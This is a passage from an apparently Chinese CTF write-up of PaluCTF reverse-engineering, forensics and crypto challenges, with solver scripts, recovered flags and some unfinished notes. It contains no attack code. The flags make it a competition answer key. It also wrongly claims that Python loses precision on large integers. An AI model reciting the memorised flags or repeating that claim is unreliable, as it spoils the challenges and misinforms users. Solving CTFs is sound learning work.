class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    F<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>F<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0xF</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>66945</p><h2 id="pylu"><a class="markdownIt-Anchor" href="#pylu"></a> PyLu</h2><p>pyins解包+pycdc反编译</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    R <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token string">b'Welcome To PaluCTF!'</span><span class="token punctuation">)</span>    MOD <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">418</span>    R <span class="token operator">=</span> R <span class="token operator">^</span> R <span class="token operator">-</span> <span class="token number">60</span> <span class="token operator">>></span> <span class="token number">24</span>    R <span class="token operator">=</span> R <span class="token operator">^</span> R <span class="token operator">-</span> <span class="token number">60</span> <span class="token operator">&lt;&lt;</span> <span class="token number">88</span>    R <span class="token operator">^</span><span class="token operator">=</span> key    R <span class="token operator">=</span> <span class="token operator">-</span>R <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">2024</span> <span class="token operator">%</span> MOD    R <span class="token operator">=</span> R <span class="token operator">*</span> key <span class="token operator">%</span> MOD    <span class="token keyword">return</span> Rflag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Welcome To PaluCTF!\nInput FLAG:'</span><span class="token punctuation">)</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cor <span class="token operator">=</span> 0x2E441F765514CCA89173554726494D37E9FBE774B6F807BC5F6E71117530CE3D7DB5F70554C03CD9055F4E42969600904DF1F4DB8L<span class="token keyword">if</span> enc<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> cor<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Congratulation!'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong FLAG!'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不会解</p><hr /><p>赛后看了一下，竟然能用z3解</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> z3<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    R <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token string">b"Welcome To PaluCTF!"</span><span class="token punctuation">)</span>    MOD <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">418</span>    R <span class="token operator">=</span> R <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>R <span class="token operator">-</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span>    R <span class="token operator">=</span> R <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>R <span class="token operator">-</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">88</span><span class="token punctuation">)</span>    R <span class="token operator">^</span><span class="token operator">=</span> key    R <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>R <span class="token operator">*</span> R <span class="token operator">*</span> <span class="token number">2024</span><span class="token punctuation">)</span> <span class="token operator">%</span> MOD      R <span class="token operator">=</span> <span class="token punctuation">(</span>R <span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token operator">%</span> MOD    <span class="token keyword">return</span> Rres <span class="token operator">=</span> <span class="token number">0x2E441F765514CCA89173554726494D37E9FBE774B6F807BC5F6E71117530CE3D7DB5F70554C03CD9055F4E42969600904DF1F4DB8</span>s <span class="token operator">=</span> z3<span class="token punctuation">.</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>key <span class="token operator">=</span> z3<span class="token punctuation">.</span>BitVec<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token number">418</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>enc<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> res<span class="token punctuation">)</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>m <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;e88f88d7-4d75-462b-8447-bf4ab7aeab1a&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://zhuanlan.zhihu.com/p/30548907">Z3一把梭：用约束求解搞定一类CTF题 - 知乎 (zhihu.com)</a></p><p>看了这篇文章感觉还是有收获的，这道题的enc函数全是一系列的位操作，利用bitVec进行z3约束求解是比较符合的，以下为赛后复现</p><hr /><h2 id="ezre签到"><a class="markdownIt-Anchor" href="#ezre签到"></a> ezre签到</h2><p>​刚开始看这道题就Go语言给吓到了就没看了，其实这道题的逻辑也不复杂</p><p>75346</p><p>就是从本地os中读入local.txt的内容，然后进行一个加密，然后保存到本地的encrypt.txt的文件当中</p><p>整个代码的流程：</p><ul><li><p>首先，这段代码读取了一个名为&quot;local.txt&quot;的文件</p></li><li><p>然后，它创建了一个映射（map），并将一些字符映射到了不同的整数值。这可能是一个字符替换的加密方法 <strong>runtime_makemap</strong></p></li><li><p>接下来，它遍历了输入文件的每个字符，使用上面创建的映射进行替换：</p></li><li><p>最后，它将加密后的内容写入到一个名为&quot;encrypted.txt&quot;的文件中</p></li></ul><p>看了别的队的wp，是利用在local.txt中写入abcdefghijklmnopqrstuvwxyz 然后获得加密文本进行逆向替换的, 如果加密算法是块类型的话或者更复杂一点的而不是单表替换 显然就无法奏效了</p><p>还是要把解密算法给逆清楚，但是go语言的函数一堆接口，以及数据结构看起来有点吃力</p><p>最近太忙了，还是先挖着坑吧</p><p><a href="https://www.anquanke.com/post/id/214940">Go二进制文件逆向分析从基础到进阶——综述-安全客 - 安全资讯平台 (anquanke.com)</a></p><h2 id="帕鲁被病毒感染了"><a class="markdownIt-Anchor" href="#帕鲁被病毒感染了"></a> 帕鲁被病毒感染了</h2><p>题目说明:电脑中的重要文件被APT组织的勒索病毒s感染，请从受感染的文件中获取标记病毒样本</p><p>附件给了一个压缩包和一个图片，有明显的切割痕迹，盲猜宽高有问题，用CRC脚本计算了一下宽高</p><p>可以得到压缩包密码<strong>palubei@2024#01</strong></p><p>76046</p><p>先看看最近修改的地方：manifest.json和repositories,manifest是配置文件，跳过不看</p><p>76161</p><p>可知983开头的文件受到了病毒感染</p><p>76260</p><p>然后在文件尾部发现了flag</p><h2 id="o2"><a class="markdownIt-Anchor" href="#o2"></a> <strong>o2</strong></h2><p>76367</p><p>查不出壳，应该是结构损坏</p><p>用ida打开提示The ELF header entry size is invalid (16944,expected 52</p><p>并且ida认为该文件为64位程序</p><p>盲猜把headers修改成32位程序了</p><p><a href="https://www.cnblogs.com/jiqingwu/p/elf_explore_2.html">ELF文件解析（二）：ELF header详解 - JollyWing - 博客园 (cnblogs.com)</a></p><p>那就改第4位为2 ， 修改后程序就可以用ida反编译了</p><p>交叉引用input：</p><p>这个是initarray函数，程序初始化后会赋值</p><p>76723</p><p>继续跟踪input，进入加密函数</p><p>76798</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">""" #正向逻辑a2='PaluCTF'a1='???'enc=''for i in range(len(a1)):    enc+=(chr(ord(a1)+ord(a2[i%len(a2)]))%128# enc = bytearray.fromhex("364d4d5c3e387e00421c597a0a7302144d5b70087e064619567336297d151f56770a7935424f2a780643") """</span><span class="token comment">#用爆破的方法</span><span class="token keyword">from</span> string <span class="token keyword">import</span> printableenc<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"364d4d5c3e387e00421c597a0a7302144d5b70087e064619567336297d151f56770a7935424f2a780643"</span><span class="token punctuation">)</span>a2<span class="token operator">=</span><span class="token string">'PaluCTF'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> printable<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token operator">==</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="茶"><a class="markdownIt-Anchor" href="#茶"></a> 茶</h2><p>赛后看wp得知是chacha20加密</p><p><a href="https://developer.aliyun.com/article/952780">【密码学】一文读懂ChaCha20-阿里云开发者社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/choumin/article/details/132804784">chacha20 算法流程-CSDN博客</a></p><p>80039</p><p>这是ChaCha20 1/4轮运算  ,根据这个也许能识别该算法</p><p>80130</p><p>然而直接解发现不对(我对这个算法还没研究明白)</p><p>80212</p><pre class="line-numbers language-none"><code class="language-none">其中，KEY_INIT由 4部分组成：KEY_INIT[0]~ KEY_INIT[15]是 16字节的常量（constant）;KEY_INIT[16]~ KEY_INIT[47]是 32字节的 key;KEY_INIT[48]~ KEY_INIT[51]是 4字节的 block counter;KEY_INIT[52]~ KEY_INIT[63]是 12字节的 nonce。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>v28显然是key矩阵 ，然而发现key_init过程只用到了v7即nonce的前8位，所以应该截取字节前8位？?</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="签到-2"><a class="markdownIt-Anchor" href="#签到-2"></a> 签到</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ncat <span class="token number">127.0</span>.0.1 <span class="token number">49864</span>Hi Paluc: <span class="token number">98876521470072624847831191120242836106634355424904228449087001789377274256416817164244577293275751367364395746152926908677673395240842983543626309956125791650694384718948488185393751748362820849920814315154022729348607056257917664879714097211171557337934164726557707762046162288673723358830278187038021933</span>p: <span class="token number">7634191592858328303720104201829885550642551766588082120933566851869152621875807377947599043353915886710003110588252519891078329707680245639560965044434287</span>e: <span class="token number">65537</span>n: <span class="token number">58280881276468779903608011114914198014673498168050506689306037336115277380066112347231925972016586673995546398141197761523506547955670113470312322471449026567491240807076753530685478376076520013004565837697497794992610136881131655961111391642576499716138406614344634751082699734458229688725947588315861198369</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这题有点坑，n，p，q比较大，导致python运算会精度丢失，不能用python算，这里我用了sage计算了m</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sage: p<span class="token number">7634191592858328303720104201829885550642551766588082120933566851869152621875807377947599043353915886710003110588252519891078329707680245639560965044434287</span>sage: c<span class="token number">98876521470072624847831191120242836106634355424904228449087001789377274256416817164244577293275751367364395746152926908677673395240842983543626309956125791650694384718948488185393751748362820849920814315154022729348607056257917664879714097211171557337934164726557707762046162288673723358830278187038021933</span>sage: <span class="token assign-left variable">phi</span><span class="token operator">=</span>euler_phi<span class="token punctuation">(</span>p*p<span class="token punctuation">)</span>sage: phi<span class="token number">58280881276468779903608011114914198014673498168050506689306037336115277380066112347231925972016586673995546398141197761523506547955670113470312322471449018933299647948748449810581276546190969370452799249615376861425758267728509780153733444043533145800251696611234046498562808656128522008480308027350816764082</span>sage: <span class="token assign-left variable">d</span><span class="token operator">=</span>inverse_mod<span class="token punctuation">(</span><span class="token number">65537</span>,phi<span class="token punctuation">)</span>sage: <span class="token assign-left variable">m</span><span class="token operator">=</span>pow<span class="token punctuation">(</span>c,d,n<span class="token punctuation">)</span>sage: m<span class="token number">56006392793429523037794282557491225182378548607499316967118649585021715585142102903175863079701722493</span><span class="token comment">#b'flag&#123;ef517c5e-0a09-4900-a2b0-b26e500e4f65&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="玛卡巴卡"><a class="markdownIt-Anchor" href="#玛卡巴卡"></a> 玛卡巴卡</h2><pre class="line-numbers language-none"><code class="language-none">玛卡巴卡玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡阿巴雅卡轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡轰咿呀呦轰达姆阿卡嗙轰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般这种都是16进制替换感觉</p><hr /><p>好吧，是玛卡巴卡编码,很难绷，这种题感觉没什么意义，我当时搜好久玛卡巴卡编码没搜到</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode_text</span><span class="token punctuation">(</span>encoded_text<span class="token punctuation">,</span> encoding_rules<span class="token punctuation">)</span><span class="token punctuation">:</span>    decoded_text <span class="token operator">=</span> <span class="token string">''</span>    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>encoded_text<span class="token punctuation">)</span><span class="token punctuation">:</span>        found <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> letter<span class="token punctuation">,</span> code <span class="token keyword">in</span> encoding_rules<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> encoded_text<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> code<span class="token punctuation">:</span>                decoded_text <span class="token operator">+=</span> letter                i <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>                found <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>            <span class="token comment"># 如果无法解码，则保留原编码</span>            decoded_text <span class="token operator">+=</span> encoded_text<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> decoded_text<span class="token comment"># 编码字典</span>encoding_rules <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡轰'</span><span class="token punctuation">,</span>    <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡轰'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢轰'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">:</span><span class="token string">'哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡轰'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token 